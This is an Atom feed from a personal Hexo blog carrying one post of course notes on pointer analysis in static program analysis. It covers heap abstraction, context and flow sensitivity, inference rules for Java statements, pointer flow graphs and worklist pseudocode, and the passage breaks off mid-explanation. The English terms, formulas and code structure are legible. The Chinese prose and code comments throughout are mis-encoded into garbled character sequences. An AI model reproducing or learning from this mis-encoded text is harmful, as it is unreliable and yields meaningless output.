<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anemone&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://anemone.top/"/>
  <updated>2020-08-24T12:43:54.530Z</updated>
  <id>http://anemone.top/</id>
  
  <author>
    <name>Anemone</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/</id>
    <published>2020-08-18T13:22:13.000Z</published>
    <updated>2020-08-24T12:43:54.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>CHA åªçœ‹å®šä¹‰ç±»å‹ï¼Œä¼šå¾—åˆ°å¾ˆå¤šå®é™…ä¸è¢«è°ƒç”¨çš„å­ç±»æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCHAçš„å¸¸é‡åˆ†ææ—¶åªèƒ½å¾—åˆ°NAC</p><p>è€ŒæŒ‡é’ˆåˆ†æä¼šå¾—åˆ°æ›´ç²¾ç¡®çš„å¯¹è±¡ç±»å‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200818213708639.png" alt="image-20200818213708639"></p><h1 id="Introduction-to-Pointer-Analysis"><a href="#Introduction-to-Pointer-Analysis" class="headerlink" title="Introduction to Pointer Analysis"></a>Introduction to Pointer Analysis</h1><blockquote><p>A fundamental static analysis, computes which memory locations a pointer can point to.</p><p>For object-oriented programs, computes which objects a pointer (variable or field) can point to.</p></blockquote><a id="more"></a><p>å³æŒ‡é’ˆåˆ†æ[1]ç”¨äºåˆ†æä¸€ä¸ªæŒ‡é’ˆç©¶ç«ŸæŒ‡å‘å“ªä¸€å—å†…å­˜ï¼Œå¯¹äºé¢å‘å¯¹è±¡ç¨‹åºï¼ŒæŒ‡é’ˆåˆ†æå¯ç”¨äºåˆ†æä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å“ªä¸€ä¸ªå˜é‡æˆ–è€…åŸŸã€‚</p><p>æŒ‡é’ˆåˆ†ææ˜¯mayåˆ†æã€‚</p><h2 id="æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ"><a href="#æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ" class="headerlink" title="æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ"></a>æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ</h2><ul><li><p>æŒ‡é’ˆåˆ†æå›ç­”æŒ‡é’ˆæŒ‡å‘å“ªä¸€ä¸ªå¯¹è±¡ï¼ˆå†…å­˜ï¼‰çš„é—®é¢˜</p></li><li><p>åˆ«ååˆ†æå›ç­”ä¸¤ä¸ªæŒ‡é’ˆæ˜¯å¦æŒ‡å‘åŒä¸€å¯¹è±¡ï¼ˆå†…å­˜ï¼‰çš„é—®é¢˜</p></li></ul><h2 id="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"><a href="#æŒ‡é’ˆåˆ†æçš„åº”ç”¨" class="headerlink" title="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"></a>æŒ‡é’ˆåˆ†æçš„åº”ç”¨</h2><ul><li>åŸºç¡€ä¿¡æ¯æ„å»º<ul><li>Call graphã€åˆ«ååˆ†æ</li></ul></li><li>ç¼–è¯‘å™¨ä¼˜åŒ–</li><li>Bugæ£€æµ‹<ul><li>ç©ºæŒ‡é’ˆå¼‚å¸¸</li></ul></li><li>å®‰å…¨åˆ†æ<ul><li>ä¿¡æ¯æµåˆ†æ</li></ul></li></ul><h1 id="Key-Factors-of-Pointer-Analysis"><a href="#Key-Factors-of-Pointer-Analysis" class="headerlink" title="Key Factors of Pointer Analysis"></a>Key Factors of Pointer Analysis</h1><p>æŒ‡é’ˆåˆ†ææ˜¯ä¸€ä¸ªå¤æ‚ç³»ç»Ÿï¼Œå¾ˆå¤šå› ç´ å½±å“äº†æŒ‡é’ˆåˆ†æçš„å‡†ç¡®åº¦å’Œæ•ˆç‡ï¼š</p><div class="table-container"><table><thead><tr><th>Factor</th><th>Problem</th><th>Choice</th></tr></thead><tbody><tr><td>Heap abstraction</td><td>å¦‚ä½•å¯¹å †å†…å­˜å»ºæ¨¡</td><td>1. Allocation site*; 2. Storeless</td></tr><tr><td>Context sensitivity</td><td>æ˜¯å¦ä¸Šä¸‹æ–‡æ•æ„Ÿ</td><td>1. Context-sensitive*; 2. Context-insensitive*</td></tr><tr><td>Flow sensitivity</td><td>æ˜¯å¦æµæ•æ„Ÿ</td><td>1. Flow-sensitive; 2. Flow-insensitive*</td></tr><tr><td>Analysis scope</td><td>åˆ†æèŒƒå›´</td><td>1. Whole-program*; 2. Demand-driven</td></tr></tbody></table></div><p>æ‰“â€œ*â€å·çš„ä¸ºæœ¬è¯¾ç¨‹ä»‹ç»çš„åˆ†ææ–¹æ³•ã€‚</p><h2 id="å †æŠ½è±¡-Heap-Abstraction"><a href="#å †æŠ½è±¡-Heap-Abstraction" class="headerlink" title="å †æŠ½è±¡(Heap Abstraction)"></a>å †æŠ½è±¡(Heap Abstraction)</h2><p>åœ¨é™æ€åˆ†æè§†è§’ä¸­ï¼Œç¨‹åºä¸­ä¼šåˆ›å»ºæ— é™æ•°é‡çš„å¯¹è±¡å®ä¾‹ï¼ˆè€ƒè™‘åˆ°éš¾ä»¥åˆ†æå¾ªç¯/é€’å½’ç»ˆæ­¢æ¡ä»¶ï¼‰ï¼Œä¸ºäº†ä¿è¯æŒ‡é’ˆåˆ†æèƒ½å¤Ÿç»ˆæ­¢ï¼Œéœ€è¦å°†æ— é™æ•°é‡çš„å¯¹è±¡æŠ½è±¡ä¸ºæœ‰é™æ•°é‡çš„å¯¹è±¡<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820210803574.png" alt="image-20200820210803574"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦æœ‰ä¸¤å¤§æµæ´¾[2]ï¼š</p><ul><li>Store based model</li><li>Storeless model</li></ul><p>å…¶ä¸­ï¼ŒStore based model ä¸­çš„ Allocation sites è¾ƒä¸ºå¸¸ç”¨ï¼Œå…¶æŠ½è±¡ä¾æ®æ˜¯åŒä¸€åˆ›å»ºç‚¹çš„å¯¹è±¡ä¸ºåŒä¸€å¯¹è±¡ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820211117510.png" alt="image-20200820211117510"></p><h2 id="ä¸Šä¸‹æ–‡æ•æ„Ÿ"><a href="#ä¸Šä¸‹æ–‡æ•æ„Ÿ" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„Ÿ"></a>ä¸Šä¸‹æ–‡æ•æ„Ÿ</h2><p>æŒ‡é’ˆåˆ†æè¿‡ç¨‹ä¸­å¦‚ä½•å¯¹è°ƒç”¨ä¸Šä¸‹æ–‡å»ºæ¨¡ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§</p><ul><li>ä¸Šä¸‹æ–‡æ•æ„Ÿ<ul><li>æ¯ä¸€ä¸ªä¸Šä¸‹æ–‡åˆ†æä¸€æ¬¡ </li><li>æ¯æ¬¡è°ƒç”¨æ—¶ï¼Œä¸åŒä¸Šä¸‹æ–‡æ–¹æ³•å¯¹è±¡ä¸ä¸€æ ·ï¼Œé‡å¤åˆ†æå‡½æ•°</li></ul></li><li>ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ<ul><li>åŒä¸€ä¸ªå‡½æ•°åªåˆ†æä¸€æ¬¡</li><li>åˆ†ææ—¶åˆå¹¶æ‰€æœ‰è°ƒç”¨çš„è¾“å…¥</li><li>ä¸€èˆ¬åœ°ç²¾åº¦è¾ƒä½</li></ul></li></ul><p>ä¸‹å›¾å·¦ä¾§ä¸ºä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå³ä¾§ä¸ºä¸Šä¸‹æ–‡ä¸æ•æ„Ÿï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820211514827.png" alt="image-20200820211514827"></p><p>ä¸ªäººè®¤ä¸ºå¯¹äºç‰¹å®šçš„åˆ†æï¼ˆå¦‚æ±¡ç‚¹åˆ†æï¼‰åšå¥½å‡½æ•°æ‘˜è¦ï¼ˆsummaryï¼‰åï¼Œå°±å¯ä»¥åšä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„åˆ†æï¼ŒåŒæ—¶ä¸æŸå¤±ç²¾åº¦ã€‚</p><h2 id="æµæ•æ„Ÿ"><a href="#æµæ•æ„Ÿ" class="headerlink" title="æµæ•æ„Ÿ"></a>æµæ•æ„Ÿ</h2><p>åšæŒ‡é’ˆåˆ†ææ—¶ï¼Œå¯¹æ§åˆ¶æµçš„å¤„ç†</p><ul><li>æ§åˆ¶æµæ•æ„Ÿ<ul><li>è€ƒè™‘æ‰§è¡Œé¡ºåº</li><li>ç»´æŠ¤æ¯ä¸€ç¨‹åºç‚¹çš„æŒ‡é’ˆæŒ‡å‘å…³ç³»</li></ul></li><li>æ§åˆ¶æµä¸æ•æ„Ÿ<ul><li>ä¿å­˜æ‰€æœ‰å¯èƒ½æŒ‡å‘çš„å¯¹è±¡</li></ul></li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820212053813.png" alt="image-20200820212053813"></p><p>å¦‚ä¸Šå›¾ä»£ç ä¸­ï¼Œæ§åˆ¶æµæ•æ„Ÿï¼ˆè“è‰²ï¼‰å¯¹æ¯ä¸ªç¨‹åºç‚¹éƒ½åšäº†è®°å½•ï¼Œè€Œæ§åˆ¶æµä¸æ•æ„Ÿï¼ˆæ©˜è‰²ï¼‰åˆ™ä¿å­˜æŒ‡é’ˆçš„æ‰€æœ‰å¯èƒ½æŒ‡å‘ï¼›</p><p>å…ˆå‰çš„æ•°æ®æµåˆ†æéƒ½æ˜¯æµæ•æ„Ÿçš„ï¼Œè€Œåœ¨javaè¯­è¨€çš„æŒ‡é’ˆåˆ†æä¸­ï¼ŒFlow-sensitiveæ•ˆæœæœªå¿…æ¯”Flow-insensitiveå¥½ï¼Œå› æ­¤ä¸»è¦ä»‹ç» insensitiveã€‚</p><h2 id="Analysis-Scope"><a href="#Analysis-Scope" class="headerlink" title="Analysis Scope"></a>Analysis Scope</h2><p>æŒ‡é’ˆåˆ†æå¯ä»¥åˆ†æå…¨ç¨‹åºï¼Œä¹Ÿå¯æ ¹æ®éœ€è¦åˆ†æéƒ¨åˆ†ä»£ç ä¸­çš„æŒ‡é’ˆä¿¡æ¯ï¼š</p><ul><li>Whole-program<ul><li>åˆ†æç¨‹åºæ‰€æœ‰ä¿¡æ¯</li></ul></li><li>Demand-driven<ul><li>åˆ†æéƒ¨åˆ†æŒ‡é’ˆä¿¡æ¯ </li><li>è®¡ç®—é‡æ¯”å…¨ç¨‹åºå°</li><li>ä½†è€ƒè™‘åˆ°ä¾èµ–ï¼Œæ‰€ä»¥è®¡ç®—é€Ÿåº¦æœªå¿…æ›´å¿«</li></ul></li></ul><h1 id="Concerned-Statements"><a href="#Concerned-Statements" class="headerlink" title="Concerned Statements"></a>Concerned Statements</h1><h2 id="Javaä¸­çš„æŒ‡é’ˆ"><a href="#Javaä¸­çš„æŒ‡é’ˆ" class="headerlink" title="Javaä¸­çš„æŒ‡é’ˆ"></a>Javaä¸­çš„æŒ‡é’ˆ</h2><ul><li><p>æœ¬åœ°å˜é‡ï¼ˆlocal variableï¼‰ï¼Œe.g., <code>x</code></p></li><li><p>é™æ€åŸŸï¼ˆstatic fieldï¼‰, e.g., <code>C.f</code>ï¼Œä½œä¸ºå…¨å±€å˜é‡åˆ†æï¼Œä¸æœ¬åœ°å˜é‡åˆ†ææ–¹æ³•ç±»ä¼¼ï¼ˆæœ¬è¯¾ä¸åšè®¨è®ºï¼‰</p></li><li><p>å¯¹è±¡åŸŸï¼ˆinstance fieldï¼‰ï¼Œe.g., <code>x.f</code>ï¼Œå®ä¾‹å¯¹è±¡çš„å±æ€§</p></li><li><p>æ•°ç»„å…ƒç´ ï¼ˆarray elementï¼‰ï¼Œe.g., array[i]ï¼Œç”±äºé™æ€åˆ†ææ²¡æ³•è®¡ç®—æ•°ç»„ä¸‹æ ‡ï¼Œé€šç”¨åšæ³•å°†å…¶ä½œä¸ºsingle fieldï¼Œä¸å¤„ç†instance fieldç±»ä¼¼ï¼ˆæœ¬è¯¾ä¸åšè®¨è®ºï¼‰<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820212836084.png" alt="image-20200820212836084"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒåŸå…ˆæ•°ç»„ä¸‹è¡¨çš„è®¿é—®<code>array[0]</code> å˜ä¸º<code>array.arr</code>ã€‚</p></li></ul><h2 id="ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥"><a href="#ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥" class="headerlink" title="ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥"></a>ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥</h2><ul><li>New: <code>x = new T()</code></li><li>Assign: <code>x = y</code></li><li>Store: <code>x.f = y</code></li><li>Load: <code>y = x.f</code></li><li>Call: <code>r = x.k (a, ...)</code></li></ul><p>æ³¨æ„å¯¹äºçœŸå®åœºæ™¯ä¸‹ <code>x.f.g.h=y</code> çš„æƒ…å†µï¼Œåœ¨ä¸‰åœ°å€ç è¡¨ç¤ºæ—¶å¯ä»¥ç”¨ä¸´æ—¶å˜é‡åšç®€åŒ–ï¼Œå˜ä¸º<code>t1=x.f; t2=t1.g; t2.h=y</code></p><p>å¯¹äºå¯¹è±¡è°ƒç”¨(Call)è¯­å¥ï¼Œå­˜åœ¨ä¸‰ç§è°ƒç”¨ç±»å‹ï¼š</p><ul><li><p>Static callï¼š<code>C.foo()</code></p></li><li><p>Special call: <code>super.foo()/x.&lt;init&gt;()/this.privateFoo()</code></p></li><li><p>Virtual call: <code>x.foo()</code></p></li></ul><p>ç”±äº static callå’Œspecial all éƒ½åªæœ‰ä¸€ç§å‡½æ•°åŸå‹ï¼Œå› æ­¤åªéœ€åˆ†ævirtual callçš„æƒ…å†µã€‚</p><h1 id="Pointer-Analysis-Rules"><a href="#Pointer-Analysis-Rules" class="headerlink" title="Pointer Analysis: Rules"></a>Pointer Analysis: Rules</h1><h2 id="Domains-and-Notations"><a href="#Domains-and-Notations" class="headerlink" title="Domains and Notations"></a>Domains and Notations</h2><p>ä»¥ä¸‹ä¸ºéœ€è¦ç”¨åˆ°çš„å®šä¹‰ï¼š</p><ul><li><p>å˜é‡ï¼š$x,y \in V$</p></li><li><p>åŸŸï¼ˆFieldsï¼‰ï¼š$f,g\in F$</p></li><li><p>å¯¹è±¡ï¼ˆObjectsï¼‰ï¼š$o_i, o_j \in O$</p></li><li>å®ä¾‹å±æ€§ï¼ˆInstance fieldsï¼‰ï¼š$o_i.f, o_j.g \in O \times F$</li><li>æŒ‡é’ˆï¼š$Pointer = V \cup (O \times F)$</li></ul><p>æ³¨ï¼š</p><ul><li>$P(O)$ æŒ‡$O$çš„å¹‚é›†</li><li><p>$pt(p)$ è¡¨ç¤ºæŒ‡å‘ $p$ çš„æŒ‡é’ˆé›†åˆ</p><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2></li></ul><p>$\frac{a}{b}$ä¸ºæ¨å¯¼ç¬¦å·ï¼Œå³å¦‚æœæ¡ä»¶ $a$ æ»¡è¶³ï¼Œé‚£ä¹ˆ $b$ ä¹Ÿæ»¡è¶³ï¼ˆåœ¨inferé‚£ä¹Ÿä»‹ç»è¿‡æ­¤ç¬¦å·ï¼‰ï¼Œä¸ªäººæ„Ÿè§‰å¯ä»¥ç†è§£ä¸º$\{a\}stmt\{b\}$ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæ»¡è¶³$a$ åï¼Œè¿›è¡Œ$b$æ“ä½œã€‚</p><ul><li><p>Newï¼Œ<code>i: x = new T()</code>ï¼Œ</p><p>æ–°å»ºå¯¹è±¡æ—¶ï¼Œ $o_i$ åŠ å…¥æŒ‡é’ˆé›†ä¸­ (å†™æ³•ä¸åŒï¼‰</p><script type="math/tex; mode=display">\frac{}{o_i \in pt(x)}</script></li><li><p>Assign, <code>x = y</code></p><script type="math/tex; mode=display">\frac{o_{i} \in p t(y)}{o_{i} \in p t(x)}</script><p>å‡ºç°èµ‹å€¼åï¼Œè®©yæŒ‡å‘çš„å†…å®¹æŒ‡å‘xï¼›</p></li><li><p>Store, <code>x.f = y</code></p><script type="math/tex; mode=display">\frac{o_i \in pt(x), o_j \in pt(y)}{o_j \in pt(o_i.f)}</script><p>èµ‹å€¼ç»™å±æ€§æ—¶ï¼Œå°†æŒ‡å‘ $y$ çš„æŒ‡é’ˆä¹Ÿæ”¾å…¥ $o_{i}.f$ çš„é›†åˆä¸­</p></li><li><p>Load, <code>y = x.f</code></p><script type="math/tex; mode=display">\frac{o_{i} \in p t(x), o_{j} \in p t\left(o_{i} . f\right)}{o_{j} \in p t(y)}</script><p>å±æ€§èµ‹å€¼ç»™å˜é‡æ—¶ï¼ŒæŒ‡å‘ $o_i.f$ çš„æŒ‡é’ˆæŒ‡å‘ $y$</p></li></ul><p>ä¸‹å›¾ç»™å‡ºå››ç§æƒ…å†µçš„å½¢è±¡è¡¨ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200821212128271.png" alt="image-20200821212128271"></p><h1 id="How-to-Implement-Pointer-Analysis"><a href="#How-to-Implement-Pointer-Analysis" class="headerlink" title="How to Implement Pointer Analysis"></a>How to Implement Pointer Analysis</h1><blockquote><p>Pointer analysis is to propagate points-to information among pointers (variables &amp; fields).</p></blockquote><p>æŒ‡é’ˆåˆ†æå°±æ˜¯åœ¨å˜é‡å’ŒåŸŸï¼ˆæŒ‡é’ˆï¼‰ä¸­ä¼ é€’æŒ‡å‘å†…å­˜çš„ä¿¡æ¯ã€‚</p><p>ä¹Ÿæœ‰è§‚ç‚¹æ˜¯æŒ‡é’ˆåˆ†æå°±æ˜¯æ±‚è§£ä¸€ç³»åˆ—æŒ‡é’ˆçš„çº¦æŸæ¡ä»¶[3]ã€‚</p><h2 id="Pointer-Flow-Graph"><a href="#Pointer-Flow-Graph" class="headerlink" title="Pointer Flow Graph"></a>Pointer Flow Graph</h2><p>å› æ­¤ä½¿ç”¨å›¾æ¥ä¿å­˜æŒ‡é’ˆä¹‹é—´çš„å…³ç³»ï¼Œå½“æŒ‡é’ˆ x å˜åŒ–æ—¶ï¼ŒåŒæ—¶éœ€è¦æ”¹å˜ x åç»§æŒ‡é’ˆçš„æŒ‡å‘å†…å®¹ã€‚</p><blockquote><p>Pointer flow graph of a program is a directed graph  that expresses how objects flow among the pointers in the program.</p></blockquote><p>å›¾ä¸­çš„ç‚¹ä¸ºæŒ‡é’ˆï¼ˆå˜é‡æˆ–è€…æŠ½è±¡å¯¹è±¡å®ä¾‹çš„åŸŸ/å±æ€§ï¼‰ï¼š</p><p>Nodesï¼š$Pointer = V \cup (O \times F)$</p><p>å›¾ä¸­çš„è¾¹ $x \rightarrow y $ è¡¨ç¤ºæŒ‡é’ˆ $x$ æŒ‡å‘çš„å¯¹è±¡ä¹Ÿè¢« $y$ æŒ‡å‘ï¼ˆ$x$ çš„æŒ‡é’ˆä¿¡æ¯æµå‘ $y$ ï¼‰</p><p>Edgesï¼š$Pointer \times Pointer$</p><p>å› æ­¤ï¼Œå…ˆå‰çš„å››æ¡è¯­å¥äº§ç”Ÿçš„è¾¹å¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823104858792.png" alt="image-20200823104858792"></p><h1 id="Pointer-Analysis-Algorithms"><a href="#Pointer-Analysis-Algorithms" class="headerlink" title="Pointer Analysis: Algorithms"></a>Pointer Analysis: Algorithms</h1><h2 id="Worklist"><a href="#Worklist" class="headerlink" title="Worklist"></a>Worklist</h2><p>$WL \subseteq      \left \langle Pointer, \mathcal{P}(O)\right \rangle^*$ï¼Œ å³WLä¸­çš„å…ƒç´ ä¸º$n, pts$ï¼Œè¡¨ç¤ºæŒ‡é’ˆ$n$å¯èƒ½æŒ‡å‘çš„å†…å­˜/å¯¹è±¡é›†åˆä¸º $pts$</p><h2 id="åŠ è¾¹å‡½æ•°-AddEdge-ï¼š"><a href="#åŠ è¾¹å‡½æ•°-AddEdge-ï¼š" class="headerlink" title="åŠ è¾¹å‡½æ•° AddEdge()ï¼š"></a>åŠ è¾¹å‡½æ•° AddEdge()ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddEdge</span><span class="params">(s, t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> s â†’ t âˆ‰ PFG:</span><br><span class="line">        add s â†’ t to PFG  <span class="comment"># å°†s â†’ tåŠ å…¥PFG</span></span><br><span class="line">        <span class="keyword">if</span> pt(s) <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">            add &lt;t, pt(s)&gt; to WL <span class="comment"># å°†&lt;t,sæŒ‡å‘å†…å®¹&gt;åŠ å…¥å·¥ä½œé˜Ÿåˆ—</span></span><br></pre></td></tr></table></figure><p>å³è‹¥æ·»åŠ  $s \rightarrow t$ ï¼Œé¦–å…ˆæ£€æŸ¥è¯¥è¾¹æ˜¯å¦åœ¨PFGä¸­ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™å°†è¯¥è¾¹åŠ å…¥PFGï¼›å¹¶ä¸”æ£€æŸ¥ s æŒ‡å‘çš„å†…å­˜é›†åˆï¼Œå¦‚æœé›†åˆä¸ç©ºï¼Œåˆ™éœ€ä¿è¯ $s$ æŒ‡å‘çš„å†…å®¹è¢« $t$ æŒ‡å‘ï¼Œå³åŠ å…¥å·¥ä½œé˜Ÿåˆ—ä¸­ã€‚</p><h2 id="æŒ‡é’ˆä¼ æ’­å‡½æ•°-Propagate-ï¼š"><a href="#æŒ‡é’ˆä¼ æ’­å‡½æ•°-Propagate-ï¼š" class="headerlink" title="æŒ‡é’ˆä¼ æ’­å‡½æ•° Propagate()ï¼š"></a>æŒ‡é’ˆä¼ æ’­å‡½æ•° Propagate()ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Propagate</span><span class="params">(n, pts)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    n: æŒ‡é’ˆn</span></span><br><span class="line"><span class="string">    pts: nå¯èƒ½æŒ‡å‘çš„æ–°çš„æŒ‡é’ˆé›†åˆ</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> pts <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        pt(n) â‹ƒ= pts <span class="comment"># å°†ptså†…å®¹å­˜å…¥åˆ°æŒ‡é’ˆæŒ‡å‘çš„é›†åˆä¸­</span></span><br><span class="line">        <span class="keyword">for</span> each n â†’ s âˆˆ PFG</span><br><span class="line">        add s, pts to WL</span><br></pre></td></tr></table></figure><p>å³ pts ä¸ä¸ºç©ºæ—¶ï¼Œå°† $pts$ å†…å®¹å­˜å…¥ $n$ çš„æŒ‡é’ˆé›†åˆä¸­ï¼Œæ¥ç€æ‰¾nçš„åç»§sï¼Œå¯¹æ¯ä¸€ä¸ªsï¼Œå°† &lt;s, pts&gt; åŠ å…¥WLã€‚</p><h2 id="ä¸»å‡½æ•°-Solve-ï¼š"><a href="#ä¸»å‡½æ•°-Solve-ï¼š" class="headerlink" title="ä¸»å‡½æ•° Solve()ï¼š"></a>ä¸»å‡½æ•° <code>Solve()</code>ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: ç¨‹åºæ‰€æœ‰è¯­å¥</span></span><br><span class="line"><span class="string">    WLï¼šå·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line"><span class="string">    PFGï¼š Pointer flow graph</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] è¡¨ç¤ºæŒ‡é’ˆnå¯èƒ½ä¼šæŒ‡å‘ptsé›†åˆï¼ˆæ¯æ¬¡è¿­ä»£å°±ä¼šæœ‰æ–°çš„å¯èƒ½ï¼‰</span></span><br><span class="line">PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;ğ‘œğ‘–&#125;&gt;&#125; è¡¨ç¤ºæŒ‡é’ˆxæŒ‡å‘å¯¹è±¡ğ‘œğ‘–</span></span><br><span class="line"><span class="keyword">for</span> each i: x = new T() âˆˆ ğ‘†: <span class="comment"># å¤„ç† new stmt</span></span><br><span class="line">add &lt;x, &#123;ğ‘œğ‘–&#125;&gt; to WL </span><br><span class="line"><span class="keyword">for</span> each x = y âˆˆ S: <span class="comment"># å¤„ç† assign stmt</span></span><br><span class="line">AddEdge(y, x)</span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Î” = pts - pt(n)</span><br><span class="line">        Propagate(n, Î”)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each ğ‘œğ‘– âˆˆ Î”:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y âˆˆ S: <span class="comment"># å¤„ç† store stmt</span></span><br><span class="line">                    AddEdge(y, ğ‘œğ‘–.ğ‘“)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f âˆˆ S: <span class="comment"># å¤„ç† load stmt</span></span><br><span class="line">                    AddEdge(ğ‘œğ‘–.ğ‘“, y)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°ï¼Œåœ¨9ã€11ã€19å’Œ21è¡Œåˆ†åˆ«å¤„ç†äº†newã€assignã€storeå’Œloadæ“ä½œï¼š</p><ul><li><p>å¯¹äºnewæ“ä½œï¼Œç›´æ¥å°† $\left \langle x, o_i \right\rangle$ åŠ å…¥worklist</p></li><li><p>å¯¹äºassignæ“ä½œï¼Œå°†xæŒ‡å‘çš„å†…å®¹ä¹Ÿè¢«yæŒ‡å‘ï¼Œå³è°ƒç”¨<code>AddEdge()</code></p></li></ul><p>æ¥ä¸‹æ¥è¿›å…¥å¾ªç¯ï¼Œç›´åˆ°å·¥ä½œé˜Ÿåˆ—ä¸ºç©ºï¼š</p><ol><li><p>å–å‡ºé˜Ÿå¤´è¦å¤„ç†çš„æŒ‡é’ˆnå’Œå…¶å¯¹åº”çš„pts</p></li><li><p>æ±‚å·®å¼‚ Î”ï¼Œptsä¸­çš„æœ‰ä¸€äº›åœ°å€å…ˆå‰å·²ç»ä¼ æ’­è¿‡ï¼Œåªéœ€å¤„ç†å‰©ä½™éƒ¨åˆ†</p></li><li><p>è°ƒç”¨<code>Propogate()</code>ï¼Œå°† Î” å†…å®¹æ”¾å…¥ $pt(n)$ å¹¶ä¸”æ·»åŠ 